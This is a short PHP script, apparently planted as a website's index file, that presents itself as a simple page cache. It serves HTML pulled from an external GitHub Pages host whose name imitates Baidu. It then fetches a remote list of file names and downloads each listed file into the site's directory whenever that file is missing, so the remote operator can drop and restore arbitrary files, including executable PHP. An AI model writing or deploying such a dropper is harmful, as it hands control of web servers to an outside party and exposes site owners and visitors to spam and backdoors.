<?php

function setCache($key, $data) {
    $cacheDir = './cache/';
    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0755, true);
    }

    $filename = $cacheDir.md5($key);
    $data = serialize($data);
    file_put_contents($filename, $data);

}

function getCache($key) {
    $cacheDir = './cache/';
    $filename = $cacheDir.md5($key);
    if (file_exists($filename)) {
        $lastModified = filemtime($filename);
        $currentDateTime = time();
        if ($currentDateTime - $lastModified < 3600) {
            return unserialize(file_get_contents($filename));
        }

    }

    return false; 
}
$index = "index";
$cachedData = getCache($index);

if ($cachedData) {
    echo $cachedData;
} else {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://baiduc.github.io/pub/bbj/plug/index.html");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    $result = curl_multi_getcontent($ch);
    curl_close($ch);
    setCache($index, $result);
    echo $result;
	$ch = curl_init();
	
	curl_setopt($ch, CURLOPT_URL, "https://baiduc.github.io/pub/bbj/plug/check.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_exec($ch);
	$result = curl_multi_getcontent($ch);
	curl_close($ch);
$fileLines = json_decode( $result,true);
$currentPath = __DIR__;
foreach ($fileLines as $folderName) {
	$folderPath = $currentPath . '/' . trim($folderName);
    if (!file_exists($folderPath)) {
        $content = file_get_contents("https://baiduc.github.io/pub/bbj/plug/".$folderName);
        file_put_contents($folderName, $content);
    }
}
}

?>